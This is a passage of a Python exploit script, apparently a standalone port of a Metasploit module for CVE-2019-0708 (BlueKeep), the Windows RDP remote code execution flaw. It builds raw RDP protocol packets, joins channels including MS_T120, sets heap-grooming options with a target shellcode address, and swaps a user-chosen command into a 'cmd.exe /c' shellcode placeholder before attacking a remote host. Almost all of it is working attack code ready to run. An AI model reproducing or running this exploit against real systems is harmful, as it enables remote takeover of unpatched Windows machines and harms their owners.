        p += b"\x03\xeb\x70\x81\x3a\x40\x00\x00\x00\x00\x00\x00\x00\xf3\x47\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x1c\x00\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00\x38\x00\x2e\x00\x31\x00\x2e\x00\x34\x00\x37\x00\x00\x00\x00\x00\x42\x00\x43\x00\x3a\x00\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x5c\x00\x53\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x6d\x00\x73\x00\x74\x00\x73\x00\x63\x00\x61\x00\x78\x00\x2e\x00\x64\x00\x6c\x00\x6c\x00\x00\x00\x00\x00\xa4\x01\x00\x00\x4d\x00\x6f\x00\x75\x00\x6e\x00\x74\x00\x61\x00\x69\x00\x6e\x00\x20\x00\x53\x00\x74\x00\x61\x00\x6e\x00\x64\x00\x61\x00\x72\x00\x64\x00\x20\x00\x54\x00\x69\x00\x6d\x00\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4d\x00\x6f\x00\x75\x00\x6e\x00\x74\x00\x61\x00\x69\x00\x6e\x00\x20\x00\x44\x00\x61\x00\x79\x00\x6c\x00\x69\x00\x67\x00\x68\x00\x74\x00\x20\x00\x54\x00\x69\x00\x6d\x00\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x02\x00\x02\x00\x00\x00\x00\x00\x00\x00\xc4\xff\xff\xff\x00\x00\x00\x00\x86\x00\x00\x00\x00\x00"
        self.transport_write(p)

    def send_channel_join(self, channel_id):
        p = b""
        p += b"\x03\x00\x00\x0c\x02\xf0\x80\x38"  # Channel Join Request PDU
        p += struct.pack(">H", self.get_user_id())
        p += struct.pack(">H", channel_id)

        self.transport_write(p)
        self.recv_packet()  # Channel Join Confirm PDU

    def send_channel_packets(self):
        p1 = b"\x03\x00\x00\x0c\x02\xf0\x80\x04\x01\x00\x01\x00"  # MCS Erect Domain
        self.transport_write(p1)

        p2 = b"\x03\x00\x00\x08\x02\xf0\x80\x28"  # MCS Attach User Request PDU
        self.transport_write(p2)
        self.recv_packet()  # MCS Attach User Confirm PDU

        self.send_channel_join(self.get_user_channel_id())  # User Channel
        self.send_channel_join(1003)  # I/O Channel

        for channel in self.channels:
            self.send_channel_join(channel.channel_id)

    def send_confirm_active(self):
        p = b""
        p += b"\x03\x00\x01\xe0\x02\xf0\x80\x64\x00\x0d\x03\xeb\x70\x81\xd1\xd1\x01\x13\x00\xef\x03\xea\x03\x01\x00\xea\x03\x08\x00\xb9\x01\x46\x52\x45\x45\x52\x44\x50\x00\x13\x00\x00\x00\x01\x00\x18\x00\x04\x00\x07\x00\x00\x02\x00\x00\x00\x00\x15\x04\x00\x00\x00\x00\x00\x00\x01\x01\x02\x00\x1c\x00\x10\x00\x01\x00\x01\x00\x01\x00\x00\x04\x00\x03\x00\x00\x01\x00\x01\x00\x00\x08\x01\x00\x00\x00\x03\x00\x58\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x14\x00\x00\x00\x01\x00\x00\x00\xaa\x00\x01\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x84\x03\x00\x00\x00\x00\x00\xe9\xfd\x00\x00\x13\x00\x28\x00\x03\x00\x00\x05\x58\x02\x00\x00\x58\x02\x00\x00\x00\x08\x00\x00\x00\x10\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x01\x00\x14\x00\x14\x00\x0d\x00\x58\x00\x3d\x00\x00\x00\x09\x04\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x08\x00\x02\x00\x00\x00\x10\x00\x34\x00\xfe\x00\x04\x00\xfe\x00\x04\x00\xfe\x00\x08\x00\xfe\x00\x08\x00\xfe\x00\x10\x00\xfe\x00\x20\x00\xfe\x00\x40\x00\xfe\x00\x80\x00\xfe\x00\x00\x01\x40\x00\x00\x01\x00\x01\x00\x01\x00\x00\x00\x00\x14\x00\x0c\x00\x00\x00\x00\x00\x40\x06\x00\x00\x0c\x00\x08\x00\x01\x00\x00\x00\x09\x00\x08\x00\x00\x00\x00\x00\x0e\x00\x08\x00\x01\x00\x00\x00\x05\x00\x0c\x00\x00\x00\x00\x00\x02\x00\x02\x00\x0a\x00\x08\x00\x06\x00\x00\x00\x07\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x06\x00\x01\x00\x1a\x00\x08\x00\xff\xff\x00\x00\x1c\x00\x0c\x00\x52\x00\x00\x00\x00\x00\x00\x00\x1d\x00\x05\x00\x00"
        self.transport_write(p)

    def send_establish_session(self):
        # Client Synchronize PDU
        p = b"\x03\x00\x00\x25\x02\xf0\x80\x64\x00\x0d\x03\xeb\x70\x80\x16\x16\x00\x17\x00\xef\x03\xea\x03\x01\x00\x00\x01\x04\x00\x1f\x00\x00\x00\x01\x00\xea\x03"
        self.transport_write(p)

        # Client Control PDU - Cooperate
        p = b"\x03\x00\x00\x29\x02\xf0\x80\x64\x00\x0d\x03\xeb\x70\x80\x1a\x1a\x00\x17\x00\xef\x03\xea\x03\x01\x00\x00\x01\x08\x00\x14\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
        self.transport_write(p)

        # Client Control PDU - Request Control
        p = b"\x03\x00\x00\x29\x02\xf0\x80\x64\x00\x0d\x03\xeb\x70\x80\x1a\x1a\x00\x17\x00\xef\x03\xea\x03\x01\x00\x00\x01\x08\x00\x14\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
        self.transport_write(p)

        # Client Persistent Key List PDU
        p = b"\x03\x00\x00\x39\x02\xf0\x80\x64\x00\x0d\x03\xeb\x70\x80\x2a\x2a\x00\x17\x00\xef\x03\xea\x03\x01\x00\x00\x01\x18\x00\x2b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00"
        self.transport_write(p)

        # Client Font List PDU
        p = b"\x03\x00\x00\x29\x02\xf0\x80\x64\x00\x0d\x03\xeb\x70\x80\x1a\x1a\x00\x17\x00\xef\x03\xea\x03\x01\x00\x00\x01\x08\x00\x27\x00\x00\x00\x00\x00\x00\x00\x03\x00\x32\x00"
        self.transport_write(p)

    def add_tpkt_header(self, p, add_x224_tpdu=True):
        if add_x224_tpdu:
            p = b"\x02\xf0\x80" + p

        tpkt = b"\x03\x00"
        tpkt += struct.pack(">H", len(p) + 4)
        tpkt += p

        return tpkt

    def terminate_connection(self):
        p = b"\x03\x00\x00\x09\x02\xf0\x80\x21\x80"
        self.transport_write(p)

    def make_channel_raw(self, channel_id, data, total_length, flags=0):
        p = b""
        p += b"\x64"  # MCS Send Data Request structure (SDrq, choice 25 from DomainMCSPDU)... right-padded two 0-bits
        p += struct.pack(">H", self.get_user_id())  # userId
        p += struct.pack(">H", channel_id)  # channelId
        p += b"\x70"  # \x80"                             # securityHeader?

        msg_len = 0x8000 | (len(data) + 8)
        p += struct.pack(">H", msg_len)  # msg packet length!
        p += struct.pack("<L", total_length)  # CHANNEL_PDU_HEADER.length
        p += struct.pack("<L", flags)  # CHANNEL_PDU_HEADER.flags

        p += data

        tpkt = self.add_tpkt_header(p)
        return tpkt

    def send_channel_raw(self, channel_id, data, total_length, flags=0):
        tpkt = self.make_channel_raw(channel_id, data, total_length, flags)
        self.transport_write(tpkt)

    def send_channel_message(self, channel_id, data):
        self.send_channel_raw(channel_id, data, len(data), 3)

    def get_user_channel_id(self):
        return 1004 + len(self.channels)

    def get_user_id(self):
        return (1004 + len(self.channels)) - 1001


"""
Helper class to run this code outside of Metasploit
"""


def parse_args():
    parser = argparse.ArgumentParser(description="CVE-2019-0708 BlueKeep Exploit")
    parser.add_argument("-v", action="store_true", help="Enable verbose output")
    parser.add_argument(
        "--groom", type=str, default="chunk", help="Groom strategy [chunk/frag]"
    )
    parser.add_argument("--groom-size", type=int, default=250, help="Groom size in MB")
    parser.add_argument(
        "--groom-base",
        type=int,
        default=0xFFFFFA8018C00000,
        help="Target address for shellcode",
    )
    parser.add_argument(
        "--groom-channel", type=str, default="RDPSND", help="Channel to groom"
    )
    parser.add_argument(
        "--groom-channel-count", type=int, default=1, help="Number of channels to groom"
    )
    parser.add_argument("--ssl", type=str, default="TLSv1", help="SSL/TLS Version")
    parser.add_argument(
        "RHOST[:RPORT]", type=str, help="Remote host/port (default: 3389)"
    )
    parser.add_argument(
        "COMMAND",
        type=str,
        help="Command to execute (replaces the AAAA... part in g_sc)",
    )
    cmd_args = parser.parse_args()

    target_info = getattr(cmd_args, "RHOST[:RPORT]")

    args = {}
    args["RHOST"] = target_info.split(":")[0]
    args["RPORT"] = int(target_info.split(":")[1]) if ":" in target_info else 3389
    args["GROOM"] = cmd_args.groom
    args["SSLVersion"] = getattr(cmd_args, "ssl")
    args["GROOMSIZE"] = cmd_args.groom_size
    args["GROOMBASE"] = cmd_args.groom_base
    args["GROOMCHANNEL"] = cmd_args.groom_channel
    args["GROOMCHANNELCOUNT"] = cmd_args.groom_channel_count
    args["EXITFUNC"] = "thread"
    args["VERBOSE"] = cmd_args.v

    # Generate payload from g_sc with custom command
    # Find the "AAAA..." part in g_sc and replace it
    shellcode = g_sc
    # The shellcode contains "cmd.exe /c " followed by 1024 A's
    # We need to replace the A's with the user command
    command_bytes = getattr(cmd_args, "COMMAND").encode("ascii")

    if len(command_bytes) > 512:
        print_bad("Command too long")
        sys.exit(1)

    # Pad with null bytes to maintain the same length
    padded_command = command_bytes + (b"\x00" * (512 - len(command_bytes)))

    # Find and replace the AAAA... part (1024 A's = 0x41 * 1024)
    aaa_pattern = b"A" * 512
    if aaa_pattern in shellcode:
        args["PAYLOAD"] = shellcode.replace(aaa_pattern, padded_command)
    else:
        print_bad("Could not find command placeholder in g_sc shellcode")
        sys.exit(1)

    return args


def log(msg, level="info"):
    symbols = {"info": "*", "good": "+", "warning": "!", "error": "-"}
    print("[%s] %s" % (symbols[level], msg))


def full_msg(msg):
    return "%s:%s - %s" % (g_config["RHOST"], g_config["RPORT"], msg)


def print_good(msg):
    log(full_msg(msg), "good")


def print_status(msg):
    log(full_msg(msg), "info")


def print_status_counter(description, i, bound, start=0x0):
    modu = int(bound / 100)
    if (i != 0 and i + 1 != bound) and (i % modu != 0):
        return

    perc = int((i + 1) / bound * 100)
    msg = "%s - %d%%" % (full_msg(description), perc)
    if i + 1 != bound:
        msg = msg + "\033[F\r"
    log(msg)


def print_sleep(description, seconds, client, tpkts):
    seconds = int(seconds)
    while True:
        msg = "%s - %d sec    " % (full_msg(description), seconds)
        if seconds == 0:
            log(msg)
            break

        msg = msg + "\033[F\r"
        seconds -= 1
        log(msg)
        client.transport_write(tpkts)
        time.sleep(1)


def print_bad(msg):
    log(full_msg(msg), "error")


def print_warning(msg):
    log(full_msg(msg), "warning")


def vprint_status(msg):
    if g_config.get("VERBOSE") != "false":
        print_status(msg)


def dummy_print(msg):
    pass


def exploit(args):
    g_config.update(args)

    try:
        start = time.time()
        # fix MSF stuff
        args["RPORT"] = int(args["RPORT"])
        args["GROOMSIZE"] = int(args["GROOMSIZE"])
        args["GROOMBASE"] = int(args["GROOMBASE"])

        if args["EXITFUNC"] != "thread":
            log("ERROR: set EXITFUNC thread", "error")
            sys.exit(1)

        g_config.update(args)

        protocol_str = "PROTOCOL_" + args["SSLVersion"]
        protocol = (
            getattr(ssl, protocol_str)
            if hasattr(ssl, protocol_str)
            else ssl.PROTOCOL_TLSv1
        )

        rdp = RdpClient(args["RHOST"], args["RPORT"], protocol, print_func=dummy_print)

        groom = GroomStrategy.factory(rdp, args)

        if not groom:
            print_bad("Invalid groom strategy: %s" % (args["GROOM"]))
            sys.exit(-1)

        rdp.add_channel(ExploitRdpdrChannel(groom))  # "rdpdr"
        rdp.add_channel(RdpChannel("rdpsnd"))
        rdp.add_channel(RdpChannel("cliprdr"))
        rdp.add_channel(RdpChannel("MS_XXX0"))
        rdp.add_channel(RdpChannel("MS_XXX1"))
        rdp.add_channel(RdpChannel("MS_XXX2"))
        rdp.add_channel(RdpChannel("MS_XXX3"))
        rdp.add_channel(RdpChannel("MS_XXX4"))
        rdp.add_channel(RdpChannel("MS_XXX5"))
        rdp.add_channel(RdpChannel("MS_T120"))

        groom.before_connect()

        print_status("Connecting to the target...")
        rdp.connect()
    except Exception as e:
        print_bad(str(e))
        print_status(traceback.format_exc())
        sys.exit(1)
    finally:
        print_status("Exploit completed in %d seconds." % (time.time() - start))


if __name__ == "__main__":
    args = parse_args()
    exploit(args)
